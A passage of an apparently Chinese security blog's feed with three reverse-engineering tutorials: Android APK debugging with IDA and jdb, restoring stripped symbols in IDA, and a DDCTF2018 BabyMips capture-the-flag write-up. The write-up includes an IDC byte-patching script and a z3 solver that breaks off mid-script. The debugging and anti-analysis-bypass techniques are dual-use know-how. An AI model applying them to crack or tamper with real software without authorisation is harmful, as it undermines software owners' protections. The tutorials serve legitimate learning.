alt></p><p>以调试模式启动APK</p><blockquote><p><strong>adb shell am start -D -n com.j.hiddendata/.MainActivity</strong></p></blockquote><p>此时真机已经进入Waiting For Debugger界面了</p><h3 id="ida下断点"><a class="header-anchor" href="#ida下断点">¶</a>ida下断点</h3><p>在我们要调试的地方设置断点</p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650937076837.png" alt></p><h3 id="ida进行动态调试"><a class="header-anchor" href="#ida进行动态调试">¶</a>ida进行动态调试</h3><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650868333739.png" alt></p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650868368483.png" alt></p><p>attach上我们的程序</p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650868402833.png" alt></p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650868433623.png" alt></p><p>此时已经停下，F9一下，让其处于运行状态</p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650868487721.png" alt></p><h3 id="启动monitor并使用jdb连接端口"><a class="header-anchor" href="#启动monitor并使用jdb连接端口">¶</a>启动monitor并使用jdb连接端口</h3><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650868567690.png" alt></p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650868595091.png" alt></p><p>端口号为8600，接下来使用jdb连接</p><blockquote><p><strong>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8600</strong></p></blockquote><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650868659975.png" alt></p><p>此时真机的等待调试窗口关闭</p><p>ida中提示已经加载，会问你包中的so文件是否和你的一致，选择same即可，接下来就是等待时间</p><p><img src="/2022/04/23/%E5%AE%89%E5%8D%93%E5%8A%A8%E8%B0%83/1650937277662.png" alt></p><p>然后就可以调试了</p><h1 id="0x01-JEB调试"><a class="header-anchor" href="#0x01-JEB调试">¶</a>0x01-JEB调试</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;安卓动态调试&lt;/p&gt;</summary>
    
    
    
    <category term="Android" scheme="https://gift1a.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="https://gift1a.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ida符号恢复</title>
    <link href="https://gift1a.github.io/2022/04/22/ida%E7%AC%A6%E5%8F%B7%E6%81%A2%E5%A4%8D/"/>
    <id>https://gift1a.github.io/2022/04/22/ida%E7%AC%A6%E5%8F%B7%E6%81%A2%E5%A4%8D/</id>
    <published>2022-04-22T09:04:39.000Z</published>
    <updated>2022-04-24T01:39:17.064Z</updated>
    
    <content type="html"><![CDATA[<p>ida符号恢复</p><span id="more"></span><h1 id="0x00-前言"><a class="header-anchor" href="#0x00-前言">¶</a>0x00-前言</h1><p>有时候我们在ida中反编译时遇到很多以地址命名的函数，而这些函数实际上是系统函数，当符号表被去除时，函数就会以函数地址命名，但是去除的只是函数的名称，我们可以通过其他方法还原，所以我们可以通过.sig文件来恢复符号，当然还有其他方法</p><h1 id="0x01-恢复符号"><a class="header-anchor" href="#0x01-恢复符号">¶</a>0x01-恢复符号</h1><h2 id="Finger"><a class="header-anchor" href="#Finger">¶</a>Finger</h2><p>符号识别神器</p><p><a href="https://github.com/aliyunav/Finger">https://github.com/aliyunav/Finger</a></p><p>按照里面的介绍安装即可</p><p><img src="/2022/04/22/ida%E7%AC%A6%E5%8F%B7%E6%81%A2%E5%A4%8D/1650621943386.png" alt="恢复前"></p><p><img src="/2022/04/22/ida%E7%AC%A6%E5%8F%B7%E6%81%A2%E5%A4%8D/1650622196897.png" alt="恢复后"></p><p>只能说太强了</p><h2 id="使用lscan和flair"><a class="header-anchor" href="#使用lscan和flair">¶</a>使用lscan和flair</h2><h3 id="lscan"><a class="header-anchor" href="#lscan">¶</a>lscan</h3><p>lscan可以扫描sig文件，找到与二进制文件最相似的库</p><p><a href="https://github.com/maroueneboubakri/lscan">https://github.com/maroueneboubakri/lscan</a></p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> ./lscan.<span class="keyword">py</span> -S .<span class="keyword">sig</span>的目录 -<span class="keyword">f</span> 要扫描的二进制文件</span><br></pre></td></tr></tbody></table></figure><p>这里我使用的是python2</p><p>也可以自己下载sig文件</p><p><a href="https://github.com/push0ebp/sig-database">https://github.com/push0ebp/sig-database</a></p><p><img src="/2022/04/22/ida%E7%AC%A6%E5%8F%B7%E6%81%A2%E5%A4%8D/1650623466335.png" alt></p><h2 id="flair"><a class="header-anchor" href="#flair">¶</a>flair</h2><p>ida加载sig文件的工具</p><p>使用方法看下面的博客吧，我自己试的时候没找到对应的</p><p><a href="https://blog.csdn.net/Breeze_CAT/article/details/103788796">https://blog.csdn.net/Breeze_CAT/article/details/103788796</a></p><h1 id="0x02-去除符号"><a class="header-anchor" href="#0x02-去除符号">¶</a>0x02-去除符号</h1><p><a href="https://cloud.tencent.com/developer/article/1839671">https://cloud.tencent.com/developer/article/1839671</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ida符号恢复&lt;/p&gt;</summary>
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Mips架构逆向初探</title>
    <link href="https://gift1a.github.io/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/"/>
    <id>https://gift1a.github.io/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</id>
    <published>2022-04-22T05:06:13.000Z</published>
    <updated>2022-04-24T01:54:46.742Z</updated>
    
    <content type="html"><![CDATA[<p>Mips架构逆向初探</p><span id="more"></span><h1 id="0x00-Mips指令架构"><a class="header-anchor" href="#0x00-Mips指令架构">¶</a>0x00-Mips指令架构</h1><blockquote><p>MIPS架构（英语：MIPS architecture，为Microprocessor without interlocked piped stages architecture的缩写，亦为Millions of Instructions Per Second的双关语），是一种采取精简指令集（RISC）的处理器架构，1981年出现，由MIPS科技公司开发并授权，广泛被使用在许多电子产品、网络设备、个人娱乐装置与商业装置上。最早的MIPS架构是32位，最新的版本已经变成64位。</p></blockquote><blockquote><p><strong>使用linux下的readelf命令可以了解到文件相关信息</strong></p></blockquote><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650604608575.png" alt></p><h1 id="0x01-环境安装"><a class="header-anchor" href="#0x01-环境安装">¶</a>0x01-环境安装</h1><p>由于程序是MIPS指令架构的，而通常我们使用的电脑是x86架构的，无法直接运行该程序，这时可以借助Qemu模拟器来运行程序。QEMU是运行在用户层的开源全虚拟化解决方案，可以在Intel机器上虚拟出完整的操作系统。QEMU主要有两种运作方式</p><ul><li>User Mode:即使用者模式，能单独运行那些为不同处理编译的Linux程序</li><li>System Mode:即系统模式，能够模拟整个操作系统，包括中央处理器及其他周边设备</li></ul><p>由于BabyMips程序是通过静态链接生成的，为了方便，在User Mode下使用QEMU来运行该程序</p><p>使用下面的命令来安装QEMU</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu<span class="operator">-</span><span class="keyword">user</span><span class="operator">-</span><span class="keyword">static</span></span><br><span class="line">sudo apt install qemu<span class="operator">-</span><span class="keyword">user</span></span><br></pre></td></tr></tbody></table></figure><p>安装qemu对应下的mips64库</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> apt install libc<span class="number">6</span>-mips<span class="number">64</span>-cross</span><br></pre></td></tr></tbody></table></figure><h1 id="0x01-DDCTF2018-BabyMips"><a class="header-anchor" href="#0x01-DDCTF2018-BabyMips">¶</a>0x01-DDCTF2018-BabyMips</h1><h2 id="静态分析"><a class="header-anchor" href="#静态分析">¶</a>静态分析</h2><p>readelf读取文件信息-Mips32-小端序</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606053687.png" alt></p><p>运行试试</p><p>出现错误</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606188738.png" alt></p><blockquote><p><strong>先使用Ghidra查看反编译代码，也可以使用ida7.5即以上版本反编译，也可以使用jeb-mips</strong></p></blockquote><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606391321.png" alt="ghidra"></p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606413794.png" alt="ida7.7"></p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606537986.png" alt="jeb"></p><p>可以看到先让我们输入，然后进入函数进行判断，所以我们需要知道函数进行了什么加密操作</p><p>进入函数后发现分析出错了，在最后跳转时跳转到了垃圾数据的位置，所以我们试一下动态调试</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606639388.png" alt></p><h2 id="动态调试"><a class="header-anchor" href="#动态调试">¶</a>动态调试</h2><p>ida+QEMU调试</p><p>首先在ida中选择Remote GDB Debugger</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650606835259.png" alt></p><p>然后Debugger设置好</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607126949.png" alt></p><p>连接</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">qemu</span>-mipsel -g <span class="number">23946</span> Baby_Mips</span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong>-g后面跟着端口号+文件名</strong></p></blockquote><p>端口的另一边可以选择IDA也可以选择GDB，这里我选择DIA</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607359256.png" alt></p><p>在IDA中启动调试</p><p>成功断下</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607396583.png" alt></p><p>接下来定位到刚才出错的地址，下个断点</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607460822.png" alt></p><p>放开程序</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607488259.png" alt="等待我们输入"></p><p>输入完成后，提示出错</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650607545161.png" alt="报错"></p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650608745243.png" alt></p><p>F8也会出现异常</p><p>查找<code>lwc1</code>指令的含义，发现是与协处理器相关的指令。通过对后面的代码块进行分析发现，后面并没有用到<code>$f29</code>和<code>$t1</code>寄存器的内容</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650609292804.png" alt="大佬的思路"></p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650609507747.png" alt></p><p>也就是说E8本来是8位，也就是两个字节，但是mips指令为4字节，所以跳转的时候出错了</p><p>使用idc进行Patch</p><p>注意idc不支持+=操作</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">auto</span> addr=<span class="number">0x4001F0</span>;</span><br><span class="line">    <span class="keyword">auto</span> addr1=<span class="number">0x403234</span>;</span><br><span class="line">    <span class="keyword">for</span>(;addr&lt;=addr1;addr=<span class="number">4</span>+addr)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(Byte(addr)==<span class="number">0xeb</span> &amp;&amp; Byte(addr+<span class="number">1</span>)==<span class="number">0x02</span>)</span><br><span class="line">        {</span><br><span class="line">            PatchByte(addr,<span class="number">0x00</span>);</span><br><span class="line">            PatchByte(addr+<span class="number">1</span>,<span class="number">0x00</span>);</span><br><span class="line">            PatchByte(addr+<span class="number">2</span>,<span class="number">0x00</span>);</span><br><span class="line">            PatchByte(addr+<span class="number">3</span>,<span class="number">0x00</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//printf("finished");</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>保存之后重新拖进jeb反编译</p><p><img src="/2022/04/22/Mips%E6%9E%B6%E6%9E%84%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/1650611442753.png" alt></p><h2 id="脚本-v6"><a class="header-anchor" href="#脚本-v6">¶</a>脚本</h2><p>十六个方程组，使用z3求解</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [BitVec(<span class="string">'a%d'</span> %i, <span class="number">32</span>) <span class="keyword">for</span> i in range(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">0xffffc20e</span>*a[<span class="number">0</span>]<span class="number">-0xbd52</span>*a[<span class="number">1</span>]+<span class="number">0x7f57</span>*a[<span class="number">2</span>]+<span class="number">0x96cd</span>*a[<span class="number">3</span>]<span class="number">-0xac7f</span>*a[<span class="number">4</span>] +<span class="number">0x5d80</span>*a[<span class="number">5</span>]+<span class="number">0xb25e</span>*a[<span class="number">6</span>]+<span class="number">0x2447</span>*a[<span class="number">7</span>]+<span class="number">0xba8a</span>*a[<span class="number">8</span>]+<span class="number">0xbb41</span>*a[<span class="number">9</span>]+<span class="number">0xa3a8</span>*a[<span class="number">10</span>]+<span class="number">0xcb12</span>*a[<span class="number">11</span>]<span class="number">-0x6958</span>*a[<span class="number">12</span>]+<span class="number">0x5821</span>*a[<span class="number">13</span>]+<span class="number">0x77ed</span>*a[<span class="number">14</span>]+<span class="number">0xf7ff</span>*a[<span class="number">15</span>] == <span class="number">0x162f0ca</span> )</span><br><span class="line">s.add(<span class="number">0xeb44</span>*a[<span class="number">0</span>]<span class="number">-0x0f99</span>*a[<span class="number">1</span>] - <span class="number">0x40e7</span>*a[<span class="number">2</span>] +<span class="number">0xdf2e</span>*a[<span class="number">3</span>] <span class="number">-0x4b2e</span>*a[<span class="number">4</span>] <span class="number">-0x96b5</span>*a[<span class="number">5</span>] +<span class="number">0x9d66</span>*a[<span class="number">6</span>] <span class="number">-0xafa8</span>*a[<span class="number">7</span>] <span class="number">-0x6e26</span>*a[<span class="number">8</span>] <span class="number">-0xe655</span>*a[<span class="number">9</span>]- <span class="number">0x9a6e</span>*a[<span class="number">10</span>] +<span class="number">0x57ba</span>*a[<span class="number">11</span>] <span class="number">-0x227c</span>*a[<span class="number">12</span>] +<span class="number">0xbdd1</span>*a[<span class="number">13</span>] +<span class="number">0xb437</span>*a[<span class="number">14</span>] +<span class="number">0x5d3f</span>*a[<span class="number">15</span>]== <span class="number">0xffec2e48</span>)</span><br><span class="line">s.add(<span class="number">0xe6f1</span>*a[<span class="number">0</span>] +<span class="number">0xa4b2</span>*a[<span class="number">1</span>] <span class="number">-0xfe74</span>*a[<span class="number">2</span>] <span class="number">-0x0f07</span>*a[<span class="number">3</span>] <span class="number">-0x5d22</span>*a[<span class="number">4</span>] <span class="number">-0xb845</span>*a[<span class="number">5</span>] <span class="number">-0x9954</span>*a[<span class="number">6</span>] +<span class="number">0x93ac</span>*a[<span class="number">7</span>] <span class="number">-0x51e4</span>*a[<span class="number">8</span>] <span class="number">-0x4b11</span>*a[<span class="number">9</span>] +<span class="number">0xdc93</span>*a[<span class="number">10</span>] +<span class="number">0x13f8</span>*a[<span class="number">11</span>] +<span class="number">0x246c</span>*a[<span class="number">12</span>] +<span class="number">0xf121</span>*a[<span class="number">13</span>] +<span class="number">0xf09f</span>*a[<span class="number">14</span>] +<span class="number">0x0dfa</span>*a[<span class="number">15</span>] == <span class="number">0xd3c060</span>)</span><br><span class="line">s.add(<span class="number">0xffff7085</span>*a[<span class="number">0</span>] <span class="number">-0x6623</span>*a[<span class="number">1</span>] +<span class="number">0x0686</span>*a[<span class="number">2</span>] +<span class="number">0x4b2d</span>*a[<span class="number">3</span>] +<span class="number">0x68df</span>*a[<span class="number">4</span>] +<span class="number">0x9be7</span>*a[<span class="number">5</span>] +<span class="number">0x21b4</span>*a[<span class="number">6</span>] +<span class="number">0xe25a</span>*a[<span class="number">7</span>] <span class="number">-0xc807</span>*a[<span class="number">8</span>] +<span class="number">0xf695</span>*a[<span class="number">9</span>] <span class="number">-0x5421</span>*a[<span class="number">10</span>] <span class="number">-0x2469</span>*a[<span class="number">11</span>] +<span class="number">0x9f29</span>*a[<span class="number">12</span>] <span class="number">-0xe311</span>*a[<span class="number">13</span>] +<span class="number">0x78f2</span>*a[<span class="number">14</span>] <span class="number">-0x6bda</span>*a[<span class="number">15</span>] == <span class="number">0x8bf576</span>)</span><br><span class="line">s.add(<span class="number">0xffff07b8</span>*a[<span class="number">0</span>] <span class="number">-0xd048</span>*a[<span class="number">1</span>] <span class="number">-0x85f1</span>*a[<span class="number">2</span>] +<span class="number">0xee84</span>*a[<span class="number">3</span>] <span class="number">-0x37d1</span>*a[<span class="number">4</span>] +<span class="number">0xb74a</span>*a[<span class="number">5</span>] +<span class="number">0xcfe2</span>*a[<span class="number">6</span>]+ <span class="number">0x8f1e</span>*a[<span class="number">7</span>] <span class="number">-0xf211</span>*a[<span class="number">8</span>] <span class="number">-0x83bf</span>*a[<span class="number">9</span>] <span class="number">-0x1249</span>*a[<span class="number">10</span>] +<span class="number">0x7ea7</span>*a[<span class="number">11</span>] <span class="number">-0x4294</span>*a[<span class="number">12</span>] <span class="number">-0xb661</span>*a[<span class="number">13</span>] <span class="number">-0x8a73</span>*a[<span class="number">14</span>] <span class="number">-0x5e5c</span>*a[<span class="number">15</span>] == <span class="number">0xff4ea5b3</span>)</span><br><span class="line">s.add(<span class="number">0xffffd6b5</span>*a[<span class="number">0</span>] <span class="number">-0x2b5f</span>*a[<span class="number">1</span>]+ <span class="number">0xc981</span>*a[<span class="number">2</span>] <span class="number">-0x60c3</span>*a[<span class="number">3</span>] +<span class="number">0xf8f2</span>*a[<span class="number">4</span>]+ <span class="number">0xded7</span>*a[<span class="number">5</span>]- <span class="number">0xf6fb</span>*a[<span class="number">6</span>] +<span class="number">0x1083</span>*a[<span class="number">7</span>]- <span class="number">0xdc96</span>*a[<span class="number">8</span>]- <span class="number">0x587e</span>*a[<span class="number">9</span>] <span class="number">-0xb4f5</span>*a[<span class="number">10</span>] +<span class="number">0xf57a</span>*a[<span class="number">11</span>] +<span class="number">0x57d0</span>*a[<span class="number">12</span>] +<span class="number">0xe814</span>*a[<span class="number">13</span>] +<span class="number">0x6169</span>*a[<span class="number">14</span>] +<span class="number">0xf285</span>*a[<span class="number">15</span>] == <span class="number">0x9dd61e</span>)</span><br><span class="line">s.add(<span class="number">0xcd89</span>*a[<span class="number">0</span>] <span class="number">-0xd43d</span>*a[<span class="number">1</span>] +<span class="number">0xf037</span>*a[<span class="number">2</span>] +<span class="number">0x83a8</span>*a[<span class="number">3</span>] <span class="number">-0xa305</span>*a[<span class="number">4</span>] <span class="number">-0xadef</span>*a[<span class="number">5</span>] +<span class="number">0xcaaa</span>*a[<span class="number">6</span>] <span class="number">-0xf145</span>*a[<span class="number">7</span>]- <span class="number">0x6073</span>*a[<span class="number">8</span>]- <span class="number">0x2777</span>*a[<span class="number">9</span>] +<span class="number">0x794f</span>*a[<span class="number">10</span>] +<span class="number">0xf00e</span>*a[<span class="number">11</span>] <span class="number">-0xe7d5</span>*a[<span class="number">12</span>] +<span class="number">0x2654</span>*a[<span class="number">13</span>] <span class="number">-0xbed0</span>*a[<span class="number">14</span>] <span class="number">-0xb8af</span>*a[<span class="number">15</span>] == <span class="number">0xff6baab3</span>)</span><br><span class="line">s.add(<span class="number">0xffff6108</span>*a[<span class="number">0</span>] <span class="number">-0x6766</span>*a[<span class="number">1</span>] +<span class="number">0xd58e</span>*a[<span class="number">2</span>] <span class="number">-0x5ca3</span>*a[<span class="number">3</span>] +<span class="number">0x2718</span>*a[<span class="number">4</span>] +<span class="number">0x1e2b</span>*a[<span class="number">5</span>] <span class="number">-0xf49e</span>*a[<span class="number">6</span>] +<span class="number">0xcf78</span>*a[<span class="number">7</span>] +<span class="number">0x7c09</span>*a[<span class="number">8</span>] <span class="number">-0x13b7</span>*a[<span class="number">9</span>] <span class="number">-0xbeee</span>*a[<span class="number">10</span>]- <span class="number">0xe450</span>*a[<span class="number">11</span>] +<span class="number">0x4da3</span>*a[<span class="number">12</span>] <span class="number">-0x8880</span>*a[<span class="number">13</span>] <span class="number">-0x5691</span>*a[<span class="number">14</span>] +<span class="number">0x8bd8</span>*a[<span class="number">15</span>] == <span class="number">0xff818f06</span>)</span><br><span class="line">s.add(<span class="number">0xffffa564</span>*a[<span class="number">0</span>] <span class="number">-0xa95a</span>*a[<span class="number">1</span>] <span class="number">-0xe643</span>*a[<span class="number">2</span>] +<span class="number">0x0d38</span>*a[<span class="number">3</span>] <span class="number">-0x097a</span>*a[<span class="number">4</span>] <span class="number">-0xeb22</span>*a[<span class="number">5</span>] +<span class="number">0xcac3</span>*a[<span class="number">6</span>] <span class="number">-0x4ed1</span>*a[<span class="number">7</span>] <span class="number">-0x7c8a</span>*a[<span class="number">8</span>] +<span class="number">0xf107</span>*a[<span class="number">9</span>] +<span class="number">0xa59e</span>*a[<span class="number">10</span>]- <span class="number">0x1213</span>*a[<span class="number">11</span>] +<span class="number">0xb2b5</span>*a[<span class="number">12</span>] <span class="number">-0x7213</span>*a[<span class="number">13</span>] <span class="number">-0x2b83</span>*a[<span class="number">14</span>] <span class="number">-0xa155</span>*a[<span class="number">15</span>] == <span class="number">0xff8d50e7</span>)</span><br><span class="line">s.add(<span class="number">0xffff6c45</span>*a[<span class="number">0</span>] <span class="number">-0x2752</span>*a[<span class="number">1</span>] <span class="number">-0xbdc3</span>*a[<span class="number">2</span>] <span class="number">-0xf495</span>*a[<span class="number">3</span>] <span class="number">-0x7121</span>*a[<span class="number">4</span>] +<span class="number">0x9c41</span>*a[<span class="number">5</span>] <span class="number">-0x9465</span>*a[<span class="number">6</span>]- <span class="number">0x6ce3</span>*a[<span class="number">7</span>] <span class="number">-0x4f28</span>*a[<span class="number">8</span>] <span class="number">-0x8350</span>*a[<span class="number">9</span>] <span class="number">-0x176e</span>*a[<span class="number">10</span>] +<span class="number">0x7814</span>*a[<span class="number">11</span>] <span class="number">-0x739a</span>*a[<span class="number">12</span>] +<span class="number">0x5494</span>*a[<span class="number">13</span>] +<span class="number">0x142d</span>*a[<span class="number">14</span>] +<span class="number">0xca55</span>*a[<span class="number">15</span>] == <span class="number">0xff3f9826</span>)</span><br><span class="line">s.add(<span class="number">0xcf01</span>*a[<span class="number">0</span>] +<span class="number">0xf378</span>*a[<span class="number">1</span>] +<span class="number">0x1064</span>*a[<span class="number">2</span>] <span class="number">-0xd9a7</span>*a[<span class="number">3</span>] <span class="number">-0x077d</span>*a[<span class="number">4</span>]+ <span class="number">0x6dab</span>*a[<span class="number">5</span>] <span class="number">-0xaf1f</span>*a[<span class="number">6</span>]- <span class="number">0x3db7</span>*a[<span class="number">7</span>] +<span class="number">0x3554</span>*a[<span class="number">8</span>] <span class="number">-0xcb8e</span>*a[<span class="number">9</span>] <span class="number">-0x9815</span>*a[<span class="number">10</span>]+ <span class="number">0xf30b</span>*a[<span class="number">11</span>] +<span class="number">0x9c5e</span>*a[<span class="number">12</span>] <span class="number">-0x5d07</span>*a[<span class="number">13</span>] <span class="number">-0x4c31</span>*a[<span class="number">14</span>] +<span class="number">0xeae0</span>*a[<span class="number">15</span>] == <span class="number">0x213fed</span>)</span><br><span class="line">s.add(<span class="number">0x8bd4</span>*a[<span class="number">0</span>] <span class="number">-0x6d81</span>*a[<span class="number">1</span>] <span class="number">-0xe772</span>*a[<span class="number">2</span>] +<span class="number">0xb6f1</span>*a[<span class="number">3</span>] +<span class="number">0x9b57</span>*a[<span class="number">4</span>] <span class="number">-0x597d</span>*a[<span class="number">5</span>] +<span class="number">0x15d1</span>*a[<span class="number">6</span>]- <span class="number">0xa55e</span>*a[<span class="number">7</span>]+ <span class="number">0xfd13</span>*a[<span class="number">8</span>]+ <span class="number">0x17b4</span>*a[<span class="number">9</span>] +<span class="number">0xec78</span>*a[<span class="number">10</span>] <span class="number">-0xd51a</span>*a[<span class="number">11</span>] +<span class="number">0x56ad</span>*a[<span class="number">12</span>] <span class="number">-0xc319</span>*a[<span class="number">13</span>] +<span class="number">0x9f8e</span>*a[<span class="number">14</span>] +<span class="number">0xfa17</span>*a[<span class="number">15</span>] == <span class="number">0xa9f0dc</span>)</span><br><span class="line">s.add(<span class="number">0xffffb798</span>*a[<span class="number">0</span>] <span class="number">-0x8bef</span>*a[<span class="number">1</span>] +<span class="number">0x109d</span>*a[<span class="number">2</span>]- <span class="number">0xf9d4</span>*a[<span class="number">3</span>] +<span class="number">0x4ecf</span>*a[<span class="number">4</span>] +<span class="number">0xa896</span>*a[<span class="number">5</span>] +<span class="number">0x773b</span>*a[<span class="number">6</span>] +<span class="number">0x6e8a</span>*a[<span class="number">7</span>] <span class="number">-0x737c</span>*a[<span class="number">8</span>]+ <span class="number">0x4979</span>*a[<span class="number">9</span>] +<span class="number">0xc685</span>*a[<span class="number">10</span>] <span class="number">-0x96ae</span>*a[<span class="number">11</span>] +<span class="number">0x0bbd</span>*a[<span class="number">12</span>] +<span class="number">0x8280</span>*a[<span class="number">13</span>] +<span class="number">0xe3a9</span>*a[<span class="number">14</span>] <span class="number">-0x730c</span>*a[<span class="number">15</span>] == <span class="number">0xbdeb20</span>)</span><br><span class="line">s.add(<span class="number">0x0b20</span>*a[<span class="number">0</span>] +<span class="number">0x9b9c</span>*a[<span class="number">1</span>] +<span class="number">0xb4aa</span>*a[<span class="number">2</span>]+ <span class="number">0x6176</span>*a[<span class="number">3</span>] +<span class="number">0x9670</span>*a[<span class="number">4</span>] +<span class="number">0x7c9d</span>*a[<span class="number">5</span>] <span class="number">-0x5402</span>*a[<span class="number">6</span>] <span class="number">-0x8cd2</span>*a[<span class="number">7</span>] +<span class="number">0xac82</span>*a[<span class="number">8</span>] +<span class="number">0xa2f5</span>*a[<span class="number">9</span>] <span class="number">-0x8efd</span>*a[<span class="number">10</span>] <span class="number">-0x65f1</span>*a[<span class="number">11</span>] <span class="number">-0x94b9</span>*a[<span class="number">12</span>] +<span class="number">0x8cb8</span>*a[<span class="number">13</span>] +<span class="number">0x1cb5</span>*a[<span class="number">14</span>] +<span class="number">0x4aa1</span>*a[<span class="number">15</span>] == <span class="number">0x9c7cf5</span>)</span><br><span class="line">s.add(<span class="number">0x57fd</span>*a[<span class="number">0</span>] +<span class="number">0x3d83</span>*a[<span class="number">1</span>] +<span class="number">0xf745</span>*a[<span class="number">2</span>] +<span class="number">0xa5c4</span>*a[<span class="number">3</span>] <span class="number">-0x65fa</span>*a[<span class="number">4</span>] <span 